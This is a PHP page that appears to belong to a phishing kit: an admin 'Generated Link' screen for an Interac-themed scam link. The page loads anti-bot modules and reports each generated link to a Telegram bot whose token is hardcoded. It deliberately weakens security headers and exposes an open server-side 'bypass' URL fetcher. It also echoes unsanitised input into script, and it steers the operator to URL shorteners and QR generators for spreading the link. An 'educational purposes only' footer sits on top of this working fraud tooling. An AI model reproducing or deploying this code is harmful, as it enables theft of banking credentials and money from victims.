<?php
include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}


$message ="INTERAC SUCCESFULLY GENERATED\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Generated Link</title>
	<style>
		body {
			background-color: black;
			font-family: Arial, sans-serif;
			color: white;
			text-align: center;
		}

		h1 {
			margin-top: 50px;
			font-size: 36px;
			text-transform: uppercase;
			letter-spacing: 2px;
		}

		form {
			margin-top: 30px;
		}

		input[type=submit] {
			background-color: red;
			color: white;
			border: none;
			padding: 10px 20px;
			border-radius: 5px;
			cursor: pointer;
			font-size: 18px;
			margin-bottom: 20px;
		}

		button {
			background-color: red;
			color: white;
			border: none;
			padding: 10px 20px;
			border-radius: 5px;
			cursor: pointer;
			font-size: 18px;
			margin-bottom: 20px;
		}

		button:hover {
			background-color: #790000;
		}

		footer {
			position: fixed;
			bottom: 0;
			left: 0;
			right: 0;
			padding: 10px;
			background-color: black;
			color: white;
			font-size: 14px;
		}
	</style>
</head>
<body>
	<header>
		<h1>Generated Link</h1>
	</header>

	<div>
		<?php
	    if(isset($_GET['url'])) {
	        $url = $_GET['url'];
	        echo "<button onclick='copyURL()'>Copy Generated Link</button>";
	        echo "<form action='https://mail.google.com/'>";
	        echo "<input type='submit' value='Go to Gmail Inbox'>";
	        echo "</form>";
	        echo "<form action='https://facebook.com/'>";
	        echo "<input type='submit' value='Go to facebook '>";
	        echo "</form>";
	        echo "<form action='https://is.gd'>";
	        echo "<input type='submit' value='is.gd '>";
	        echo "</form>";
	        echo "<form action='https://qr-code-generator.com'>";
	        echo "<input type='submit' value='qr-code-gen'>";
	        echo "</form>";
	        echo "<form action='/admin/Main.php'>";
	        echo "<input type='submit' value='return to home Page'>";
	        echo "</form>";
	    }
	    ?>
	</div>

	<script>
	    function copyURL() {
	        var dummy = document.createElement("input");
	        document.body.appendChild(dummy);
	        dummy.setAttribute("id", "dummy_id");
	        document.getElementById("dummy_id").value = "<?php echo $url; ?>";
	        dummy.select();
	        document.execCommand("copy");
	        document.body.removeChild(dummy);
	        alert("Generated link copied to clipboard!");
	    }
	</script>

	<footer>
		<p>For educational purposes only | RANDOM RYAN</p>
	</footer>
</body>
</html>